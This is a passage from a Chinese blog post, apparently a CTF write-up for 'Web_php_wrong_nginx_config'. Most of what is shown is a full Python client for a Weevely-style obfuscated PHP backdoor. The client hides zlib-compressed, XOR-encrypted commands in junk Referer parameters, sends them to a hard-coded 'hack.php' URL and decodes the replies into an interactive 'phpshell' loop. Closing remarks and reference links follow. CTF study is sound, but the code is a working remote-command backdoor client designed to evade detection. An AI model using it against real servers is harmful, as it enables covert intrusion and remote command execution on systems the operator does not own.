class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint,choice<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choicePart</span>(<span class="hljs-params">seq,amount</span>):<br>    length = <span class="hljs-built_in">len</span>(seq)<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> length &lt; amount:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Error Input&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    result = []<br>    indexes = []<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> count &lt; amount:<br>        i = randint(<span class="hljs-number">0</span>,length-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> indexes:<br>            indexes.append(i)<br>            result.append(seq[i])<br>            count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count == amount:<br>                <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">randBytesFlow</span>(<span class="hljs-params">amount</span>):<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):<br>        result += <span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>))<br>    <span class="hljs-keyword">return</span>  result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">randAlpha</span>(<span class="hljs-params">amount</span>):<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):<br>        result += choice(string.ascii_letters)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loopXor</span>(<span class="hljs-params">text,key</span>):<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    lenKey = <span class="hljs-built_in">len</span>(key)<br>    lenTxt = <span class="hljs-built_in">len</span>(text)<br>    iTxt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> iTxt &lt; lenTxt:<br>        iKey = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> iTxt&lt;lenTxt <span class="hljs-keyword">and</span> iKey&lt;lenKey:<br>            result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[iKey]) ^ <span class="hljs-built_in">ord</span>(text[iTxt]))<br>            iTxt += <span class="hljs-number">1</span><br>            iKey += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debugPrint</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">if</span> debugging:<br>        <span class="hljs-built_in">print</span> msg<br><br><span class="hljs-comment"># config</span><br>debugging = <span class="hljs-literal">False</span><br>keyh = <span class="hljs-string">&quot;42f7&quot;</span> <span class="hljs-comment"># $kh</span><br>keyf = <span class="hljs-string">&quot;e9ac&quot;</span> <span class="hljs-comment"># $kf</span><br>xorKey = keyh + keyf<br>url = <span class="hljs-string">&#x27;http://61.147.171.105:63612/hack.php&#x27;</span><br>defaultLang = <span class="hljs-string">&#x27;zh-CN&#x27;</span><br>languages = [<span class="hljs-string">&#x27;zh-TW;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;zh-HK;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;en-US;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;en;q=0.%d&#x27;</span>]<br>proxies = <span class="hljs-literal">None</span> <span class="hljs-comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span><br><br>sess = requests.Session()<br><br><span class="hljs-comment"># generate random Accept-Language only once each session</span><br>langTmp = choicePart(languages,<span class="hljs-number">3</span>)<br>indexes = <span class="hljs-built_in">sorted</span>(choicePart(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>),<span class="hljs-number">3</span>), reverse=<span class="hljs-literal">True</span>)<br><br>acceptLang = [defaultLang]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):<br>    acceptLang.append(langTmp[i] % (indexes[i],))<br>acceptLangStr = <span class="hljs-string">&#x27;,&#x27;</span>.join(acceptLang)<br>debugPrint(acceptLangStr)<br><br>init2Char = acceptLang[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + acceptLang[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-comment"># $i</span><br>md5head = (md5(init2Char + keyh).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br>md5tail = (md5(init2Char + keyf).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>] + randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))<br>debugPrint(<span class="hljs-string">&#x27;$i is %s&#x27;</span> % (init2Char))<br>debugPrint(<span class="hljs-string">&#x27;md5 head: %s&#x27;</span> % (md5head,))<br>debugPrint(<span class="hljs-string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))<br><br><span class="hljs-comment"># Interactive php shell</span><br>cmd = raw_input(<span class="hljs-string">&#x27;phpshell &gt; &#x27;</span>)<br><span class="hljs-keyword">while</span> cmd != <span class="hljs-string">&#x27;&#x27;</span>:<br>    <span class="hljs-comment"># build junk data in referer</span><br>    query = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">max</span>(indexes)+<span class="hljs-number">1</span>+randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)):<br>        key = randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>))<br>        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="hljs-number">3</span>,<span class="hljs-number">12</span>)))<br>        query.append((key, value))<br>    debugPrint(<span class="hljs-string">&#x27;Before insert payload:&#x27;</span>)<br>    debugPrint(query)<br>    debugPrint(urllib.urlencode(query))<br><br>    <span class="hljs-comment"># encode payload</span><br>    payload = zlib.compress(cmd)<br>    payload = loopXor(payload,xorKey)<br>    payload = base64.urlsafe_b64encode(payload)<br>    payload = md5head + payload<br><br>    <span class="hljs-comment"># cut payload, replace into referer</span><br>    cutIndex = randint(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">3</span>)<br>    payloadPieces = (payload[<span class="hljs-number">0</span>:cutIndex], payload[cutIndex:], md5tail)<br>    iPiece = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexes:<br>        query[i] = (query[i][<span class="hljs-number">0</span>],payloadPieces[iPiece])<br>        iPiece += <span class="hljs-number">1</span><br>    referer = url + <span class="hljs-string">&#x27;?&#x27;</span> + urllib.urlencode(query)<br>    debugPrint(<span class="hljs-string">&#x27;After insert payload, referer is:&#x27;</span>)<br>    debugPrint(query)<br>    debugPrint(referer)<br><br>    <span class="hljs-comment"># send request</span><br>    r = sess.get(url,headers=&#123;<span class="hljs-string">&#x27;Accept-Language&#x27;</span>:acceptLangStr,<span class="hljs-string">&#x27;Referer&#x27;</span>:referer&#125;,proxies=proxies)<br>    html = r.text<br>    debugPrint(html)<br><br>    <span class="hljs-comment"># process response</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey,xorKey))<br>    output = pattern.findall(html)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Error,  no backdoor response&#x27;</span><br>        cmd = raw_input(<span class="hljs-string">&#x27;phpshell &gt; &#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    output = output[<span class="hljs-number">0</span>]<br>    debugPrint(output)<br>    output = output.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)<br>    output = loopXor(output,xorKey)<br>    output = zlib.decompress(output)<br>    <span class="hljs-built_in">print</span> output<br>    cmd = raw_input(<span class="hljs-string">&#x27;phpshell &gt; &#x27;</span>)<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231015152309021.png'><img src="image-20231015152309021.png" alt="image-20231015152309021"></p>
<p class='item-img' data-src='image-20231015152337018.png'><img src="image-20231015152337018.png" alt="image-20231015152337018"></p>
<p>拿到flag</p>
<p>随后本想着学习一波PHP混淆，结果真实开了眼，根本看不懂。。。</p>
<p>下去得思考一下如何学了</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64966153/article/details/125612782?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169735116916800227451417%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169735116916800227451417&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125612782-null-null.142%5Ev96%5Epc_search_result_base7&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config&amp;spm=1018.2226.3001.4187">攻防世界-WEB进阶区-Web_php_wrong_nginx_config</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40884727/article/details/101982631?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169735116916800227451417%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169735116916800227451417&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-101982631-null-null.142%5Ev96%5Epc_search_result_base7&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config&amp;spm=1018.2226.3001.4187">[wp] 攻防世界 Web_php_wrong_nginx_config</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aa2528877987/article/details/131288189?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169735116916800227451417%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169735116916800227451417&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-131288189-null-null.142%5Ev96%5Epc_search_result_base7&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config&amp;spm=1018.2226.3001.4187">【愚公系列】2023年06月 攻防世界-Web（Web_php_wrong_nginx_config）</a></p>
<p><a target="_blank" rel="noopener" href="https://phuker.github.io/posts/weevely-backdoor-code-analysis.html">[Weevely：一个 PHP 混淆后门的代码分析]</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/107801811?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-107801811.142%5Ev96%5Epc_search_result_base7&amp;spm=1018.2226.3001.4187">攻防世界 web高手进阶区 7分题 Web_php_wrong_nginx_config</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/16/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/">← 下一篇 php无参数RCE</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/15/sql%E6%B3%A8%E5%85%A5-%E6%8B%93%E5%B1%95/">sql注入学习--拓展 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">题目解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>